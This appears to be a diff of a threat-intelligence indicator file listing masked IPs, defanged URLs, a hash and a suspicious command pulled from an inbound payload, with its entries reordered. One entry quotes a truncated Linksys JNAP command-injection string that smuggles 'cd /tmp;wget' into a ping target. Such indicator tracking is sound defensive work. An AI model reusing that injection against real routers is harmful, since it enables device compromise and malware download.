@@ -1,17 +1,5 @@
 [
   {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "190.179.168.XXX"
-  },
-  {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "91.92.40.XXX"
-  },
-  {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
@@ -24,16 +12,28 @@
     "value": "hxxp://linksys[.]com/jnap/network/Diagnostics"
   },
   {
-    "context": "Inbound payload hash (unknown)",
+    "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "2cd418902688de219bb72a3e427cbcf93deb0e19ca324ae9d6ae16d814eec359"
+    "type": "ip",
+    "value": "190.179.168.XXX"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "91.92.40.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "{\"JNAP\":{\"action\":\"hxxp://linksys[.]com/jnap/network/Diagnostics\",\"command\":\"Ping\",\"target\":\"[internal-ip-redacted]%20`cd /tmp;wget htt"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "2cd418902688de219bb72a3e427cbcf93deb0e19ca324ae9d6ae16d814eec359"
   },
   {
     "asn": "TechTies Inc.",
